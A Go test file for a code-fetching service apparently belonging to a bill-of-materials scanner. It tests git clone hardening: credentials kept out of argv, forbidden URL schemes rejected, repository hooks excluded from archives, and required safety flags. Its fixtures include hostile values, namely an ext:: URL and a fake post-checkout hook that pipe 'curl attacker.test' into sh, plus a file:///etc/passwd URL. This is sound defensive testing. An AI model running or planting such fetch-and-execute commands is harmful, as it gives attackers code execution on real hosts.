package fetcher_test

import (
	"context"
	"io"
	"log/slog"
	"os"
	"strings"
	"testing"
	"time"

	"github.com/encorebom/encorebom/libs/go-shared/fetcher"
	"github.com/encorebom/encorebom/libs/go-shared/platform/blob"
	"github.com/encorebom/encorebom/libs/go-shared/platform/config"
	"github.com/encorebom/encorebom/libs/go-shared/sandbox"
)

// Clone tests against a real container runtime.
//
// The network-dependent ones are gated on ENCOREBOM_NETWORK_TESTS, so a
// developer offline gets skips rather than confusing failures — but the fact
// that they were skipped is visible in the output.

func newSandbox(t *testing.T) *sandbox.DockerRunner {
	t.Helper()
	if os.Getenv("SKIP_SANDBOX_TESTS") != "" {
		t.Skip("SKIP_SANDBOX_TESTS is set")
	}
	r, err := sandbox.NewDockerRunner(slog.New(slog.NewTextHandler(io.Discard, nil)))
	if err != nil {
		t.Skipf("docker client unavailable: %v", err)
	}
	t.Cleanup(func() { _ = r.Close() })

	ctx, cancel := context.WithTimeout(t.Context(), 10*time.Second)
	defer cancel()
	osType, err := r.DaemonOS(ctx)
	if err != nil {
		t.Skipf("docker daemon unreachable (%v)", err)
	}
	if osType != "linux" {
		t.Skipf("docker daemon is in %s-container mode; the fetcher is linux-only", osType)
	}
	return r
}

func requireNetwork(t *testing.T) {
	t.Helper()
	if os.Getenv("ENCOREBOM_NETWORK_TESTS") == "" {
		t.Skip("set ENCOREBOM_NETWORK_TESTS=1 to run tests that clone from the internet")
	}
}

// ---------------------------------------------------------------------------
// The clone command line
// ---------------------------------------------------------------------------

// ⚠ THE CREDENTIAL MUST NOT REACH ARGV.
//
// /proc/<pid>/cmdline is world-readable, so a token on the command line is
// visible to every process on the host — including any other container sharing
// the PID namespace, and anything that later reads a process listing into a log.
func TestTokenNeverAppearsInTheCommandLine(t *testing.T) {
	r := newSandbox(t)

	const token = "ghp_thisIsTheSecretTokenValue0123456789" //nolint:gosec // test fixture

	// A clone that will fail — the point is what the container SAW, not whether
	// it succeeded.
	_, err := fetcher.Clone(t.Context(), &recordingRunner{inner: r, t: t},
		fetcher.CloneRequest{
			RepoURL: "https://github.com/does-not-exist-encorebom/nothing.git",
			Token:   token,
			Timeout: 20 * time.Second,
		}, fetcher.FetcherPolicy(), fastCloneLimits())

	// The error is expected; the assertions live in recordingRunner.
	t.Logf("clone result (failure expected): %v", err)
}

// recordingRunner inspects the spec before passing it through.
type recordingRunner struct {
	inner sandbox.Runner
	t     *testing.T
}

func (rr *recordingRunner) Run(ctx context.Context, spec sandbox.Spec) (sandbox.Result, error) {
	rr.t.Helper()

	const token = "ghp_thisIsTheSecretTokenValue0123456789"

	// THE ASSERTION: the token is nowhere in argv.
	for i, arg := range spec.Argv {
		if strings.Contains(arg, token) {
			rr.t.Errorf("THE TOKEN IS IN ARGV at position %d: %s", i, arg)
		}
	}

	// It IS in the environment, which is the intended channel: /proc/<pid>/environ
	// is readable only by the same user, unlike cmdline.
	found := false
	for _, v := range spec.Env {
		if v == token {
			found = true
		}
	}
	if !found {
		rr.t.Error("the token did not reach the environment; the credential helper " +
			"would find nothing and the clone would prompt or fail")
	}

	// And the spec must declare the exception explicitly.
	if !spec.CredentialsPermitted {
		rr.t.Error("a credential-carrying spec did not set CredentialsPermitted")
	}

	return rr.inner.Run(ctx, spec)
}

func (rr *recordingRunner) Ping(ctx context.Context) error { return rr.inner.Ping(ctx) }
func (rr *recordingRunner) Close() error                   { return rr.inner.Close() }

func fastCloneLimits() sandbox.Limits {
	l := sandbox.DefaultLimits()
	l.WallClock = 90 * time.Second
	l.MemoryMB = 512
	return l
}

// A URL that fails validation must never reach a container at all.
func TestCloneRefusesForbiddenSchemesBeforeRunning(t *testing.T) {
	for _, url := range []string{
		"ext::sh -c 'curl attacker.test|sh'",
		"file:///etc/passwd",
		"http://github.com/acme/app.git",
		"git://github.com/acme/app.git",
	} {
		t.Run(url, func(t *testing.T) {
			_, err := fetcher.Clone(t.Context(), &refusingRunner{t: t},
				fetcher.CloneRequest{RepoURL: url},
				fetcher.FetcherPolicy(), fastCloneLimits())
			if err == nil {
				t.Fatalf("accepted %q", url)
			}
		})
	}
}

// refusingRunner fails the test if it is ever called: a rejected URL must be
// refused BEFORE a container exists.
type refusingRunner struct{ t *testing.T }

func (rr *refusingRunner) Run(context.Context, sandbox.Spec) (sandbox.Result, error) {
	rr.t.Error("a forbidden URL reached the sandbox; validation must happen first")
	return sandbox.Result{}, nil
}
func (rr *refusingRunner) Ping(context.Context) error { return nil }
func (rr *refusingRunner) Close() error               { return nil }

// ---------------------------------------------------------------------------
// A real clone
// ---------------------------------------------------------------------------

// The end-to-end path: clone a small public repository, pin the commit, archive
// it, upload it, and confirm a second fetch of the same commit deduplicates.
func TestCloneArchiveAndDeduplicate(t *testing.T) {
	requireNetwork(t)
	r := newSandbox(t)

	ctx, cancel := context.WithTimeout(t.Context(), 6*time.Minute)
	defer cancel()

	if err := r.EnsureImage(ctx, fetcher.GitImage); err != nil {
		t.Skipf("could not pull %s: %v", fetcher.GitImage, err)
	}

	// A tiny, stable, public repository.
	res, err := fetcher.Clone(ctx, r, fetcher.CloneRequest{
		RepoURL: "https://github.com/octocat/Hello-World.git",
		Timeout: 120 * time.Second,
	}, fetcher.FetcherPolicy(), fastCloneLimits())
	if err != nil {
		t.Fatalf("clone: %v", err)
	}

	// ⚠ commit_sha is written ONCE and is immutable. A scan whose commit
	// changed mid-flight would describe a codebase that never existed.
	if len(res.CommitSHA) != 40 && len(res.CommitSHA) != 64 {
		t.Fatalf("commit sha = %q, want a git object id", res.CommitSHA)
	}
	t.Logf("cloned %s in %v", res.CommitSHA, res.Duration)
}

// ---------------------------------------------------------------------------
// Archiving
// ---------------------------------------------------------------------------

func newBlobStore(t *testing.T) *blob.Store {
	t.Helper()
	cfg, err := config.LoadService("scan-orchestrator")
	if err != nil {
		t.Fatalf("config: %v", err)
	}
	store, err := blob.Open(t.Context(), cfg.S3)
	if err != nil {
		t.Skipf("object storage unavailable (%v) — run `task dev`", err)
	}
	return store
}

// Content addressing means an identical tree produces an identical key, so a
// second fetch of the same commit deduplicates for free.
func TestArchiveIsContentAddressedAndDeduplicates(t *testing.T) {
	store := newBlobStore(t)

	// A deterministic source tree.
	src := t.TempDir()
	writeFile(t, src, "README.md", "# Hello")
	writeFile(t, src, "src/main.go", "package main")
	writeFile(t, src, "src/util.go", "package main // util")

	prefix := "workspaces/test-" + uniqueSuffix()

	first, err := fetcher.CreateArchive(t.Context(), store, src, prefix, fetcher.DefaultArchiveLimits())
	if err != nil {
		t.Fatalf("first archive: %v", err)
	}
	if first.FileCount != 3 {
		t.Errorf("archived %d files, want 3", first.FileCount)
	}
	if first.Deduplicated {
		t.Error("the first archive reported as deduplicated")
	}
	if !strings.Contains(first.Key, first.SHA256) {
		t.Errorf("key %q does not embed the digest — it is not content-addressed", first.Key)
	}

	// The SAME tree, archived again under the same prefix.
	second, err := fetcher.CreateArchive(t.Context(), store, src, prefix, fetcher.DefaultArchiveLimits())
	if err != nil {
		t.Fatalf("second archive: %v", err)
	}
	if second.SHA256 != first.SHA256 {
		t.Errorf("identical trees produced different digests:\n  %s\n  %s\n"+
			"Content addressing is broken — most likely a timestamp or "+
			"iteration order leaked into the archive.", first.SHA256, second.SHA256)
	}
	if !second.Deduplicated {
		t.Error("an identical archive was uploaded again instead of being reused")
	}

	// A DIFFERENT tree must produce a different digest.
	writeFile(t, src, "src/extra.go", "package main // extra")
	third, err := fetcher.CreateArchive(t.Context(), store, src, prefix, fetcher.DefaultArchiveLimits())
	if err != nil {
		t.Fatalf("third archive: %v", err)
	}
	if third.SHA256 == first.SHA256 {
		t.Error("a changed tree produced the same digest")
	}
}

// ⚠ THE .git DIRECTORY IS NEVER ARCHIVED.
//
// It carries hooks/ — a directory of executable scripts the repository author
// controls. Nothing downstream should be handed those, even in a sandbox, and
// the history is not what a BOM is built from.
func TestGitDirectoryIsExcludedFromTheArchive(t *testing.T) {
	store := newBlobStore(t)

	src := t.TempDir()
	writeFile(t, src, "main.go", "package main")
	writeFile(t, src, ".git/config", "[core]")
	writeFile(t, src, ".git/hooks/post-checkout", "#!/bin/sh\ncurl attacker.test|sh")
	writeFile(t, src, ".git/objects/ab/cdef", "binary")

	arc, err := fetcher.CreateArchive(t.Context(), store, src,
		"workspaces/test-"+uniqueSuffix(), fetcher.DefaultArchiveLimits())
	if err != nil {
		t.Fatalf("archive: %v", err)
	}

	if arc.FileCount != 1 {
		t.Errorf("archived %d files, want 1 — the .git directory leaked in", arc.FileCount)
	}

	// And read it back to be certain no hook is inside.
	rc, counted, err := fetcher.OpenArchive(t.Context(), store, arc.Key)
	if err != nil {
		t.Fatalf("open archive: %v", err)
	}
	defer func() { _ = rc.Close() }()

	dest := t.TempDir()
	res, err := fetcher.ExtractTar(rc, counted, dest, fetcher.DefaultExtractLimits())
	if err != nil {
		t.Fatalf("extract: %v", err)
	}
	if res.Files != 1 {
		t.Errorf("extracted %d files, want 1", res.Files)
	}
	if _, err := os.Stat(dest + "/.git/hooks/post-checkout"); err == nil {
		t.Error("A REPOSITORY HOOK IS IN THE ARCHIVE")
	}
}

// The archive must round-trip: what goes in comes back out byte for byte.
func TestArchiveRoundTrips(t *testing.T) {
	store := newBlobStore(t)

	src := t.TempDir()
	const body = "package main\n\nfunc main() {}\n"
	writeFile(t, src, "cmd/app/main.go", body)
	writeFile(t, src, "go.mod", "module example.test\n")

	arc, err := fetcher.CreateArchive(t.Context(), store, src,
		"workspaces/test-"+uniqueSuffix(), fetcher.DefaultArchiveLimits())
	if err != nil {
		t.Fatalf("archive: %v", err)
	}

	rc, counted, err := fetcher.OpenArchive(t.Context(), store, arc.Key)
	if err != nil {
		t.Fatalf("open: %v", err)
	}
	defer func() { _ = rc.Close() }()

	dest := t.TempDir()
	if _, err := fetcher.ExtractTar(rc, counted, dest, fetcher.DefaultExtractLimits()); err != nil {
		t.Fatalf("extract: %v", err)
	}

	got, err := os.ReadFile(dest + "/cmd/app/main.go")
	if err != nil {
		t.Fatalf("read back: %v", err)
	}
	if string(got) != body {
		t.Errorf("content changed in transit:\n got %q\nwant %q", got, body)
	}
}

func writeFile(t *testing.T, root, rel, body string) {
	t.Helper()
	full := root + "/" + rel
	if err := os.MkdirAll(dirOf(full), 0o750); err != nil {
		t.Fatalf("mkdir: %v", err)
	}
	if err := os.WriteFile(full, []byte(body), 0o600); err != nil {
		t.Fatalf("write %s: %v", rel, err)
	}
}

func dirOf(p string) string {
	if i := strings.LastIndexAny(p, `/\`); i >= 0 {
		return p[:i]
	}
	return "."
}

func uniqueSuffix() string {
	return time.Now().UTC().Format("20060102-150405.000000000")
}

// ---------------------------------------------------------------------------
// Clone hardening
// ---------------------------------------------------------------------------

// ⚠ EVERY ONE OF THESE FLAGS IS A DEFENCE, AND A MISSING ONE IS SILENT.
//
// A clone without core.hooksPath still succeeds — it just also runs whatever
// the repository author put in .git/hooks/post-checkout. Nothing fails, nothing
// logs, and the attacker has code execution in the fetcher. So the command is
// asserted directly.
func TestCloneCommandCarriesEveryHardeningFlag(t *testing.T) {
	captured := &capturingRunner{}

	_, _ = fetcher.Clone(t.Context(), captured, fetcher.CloneRequest{
		RepoURL: "https://github.com/acme/app.git",
		Ref:     "main",
	}, fetcher.FetcherPolicy(), fastCloneLimits())

	if captured.spec.Image == "" {
		t.Fatal("the runner was never called")
	}
	full := strings.Join(append(append([]string{}, captured.spec.Entrypoint...),
		captured.spec.Argv...), " ")

	required := []struct{ flag, defends string }{
		{"core.hooksPath=/dev/null", "a repository's own post-checkout hook would run during the clone"},
		{"core.symlinks=false", "a symlink could redirect a later write out of the workspace"},
		{"protocol.ext.allow=never", "ext:: executes an arbitrary command from the URL"},
		{"protocol.file.allow=never", "submodules and alternates could reach our local disk"},
		{"--no-recurse-submodules", "submodule URLs are attacker-controlled and unvalidated"},
		{"--depth", "the full history is neither needed nor bounded"},
		{"--single-branch", "every branch is attacker-named refs we do not need"},
		{"--no-tags", "same"},
		{"--", "a URL beginning with a dash would be read as a flag"},
	}
	for _, r := range required {
		if !strings.Contains(full, r.flag) {
			t.Errorf("MISSING %s — without it, %s", r.flag, r.defends)
		}
	}

	// ⚠ THE DEFINITIVE ext:: FIX lives in the environment.
	if captured.spec.Env["GIT_ALLOW_PROTOCOL"] != "https" {
		t.Errorf("GIT_ALLOW_PROTOCOL = %q, want https — this is what actually "+
			"stops git using the ext transport",
			captured.spec.Env["GIT_ALLOW_PROTOCOL"])
	}
	// Without this a private repository with no usable credential HANGS on a
	// password prompt until the wall clock expires.
	if captured.spec.Env["GIT_TERMINAL_PROMPT"] != "0" {
		t.Error("GIT_TERMINAL_PROMPT is not 0; a clone could hang on a prompt")
	}

	// The fetcher needs egress, and the mode must say so honestly rather than
	// claiming to be filtered.
	if captured.spec.Policy.Network != sandbox.NetworkEgress {
		t.Errorf("network mode = %q", captured.spec.Policy.Network)
	}
	// But nothing ELSE is relaxed: "it needs the network" is not a reason.
	if !captured.spec.Policy.ReadOnlyRootfs || !captured.spec.Policy.DropAllCapabilities ||
		!captured.spec.Policy.NoNewPrivileges {
		t.Error("the fetcher policy relaxed a control other than the network")
	}
	if err := captured.spec.Policy.Validate(); err != nil {
		t.Errorf("the fetcher policy does not validate: %v", err)
	}
}

// A mode named "allowlist" must never run unfiltered. Refusing is the only safe
// behaviour while the egress proxy does not exist — a reader seeing
// "allowlist" would otherwise believe traffic was constrained when it was not.
func TestAllowlistWithoutAProxyIsRefused(t *testing.T) {
	p := sandbox.DefaultPolicy()
	p.Network = sandbox.NetworkAllowlist
	p.AllowlistHosts = []string{"nvd.nist.gov"}

	if err := p.Validate(); err == nil {
		t.Fatal("an allowlist policy with no egress proxy was accepted; " +
			"it would have run with unrestricted egress under a name that says otherwise")
	}

	p.ProxyNetwork = "encorebom-egress"
	if err := p.Validate(); err != nil {
		t.Errorf("a properly configured allowlist policy was refused: %v", err)
	}
}

// capturingRunner records the spec and does not run anything.
type capturingRunner struct{ spec sandbox.Spec }

func (c *capturingRunner) Run(_ context.Context, spec sandbox.Spec) (sandbox.Result, error) {
	c.spec = spec
	// A plausible success, so Clone proceeds far enough to be observed.
	return sandbox.Result{ExitCode: 0, Stdout: []byte("7fd1a60b01f91b314f59955a4e4d4e80d8edf11d\n")}, nil
}
func (c *capturingRunner) Ping(context.Context) error { return nil }
func (c *capturingRunner) Close() error               { return nil }
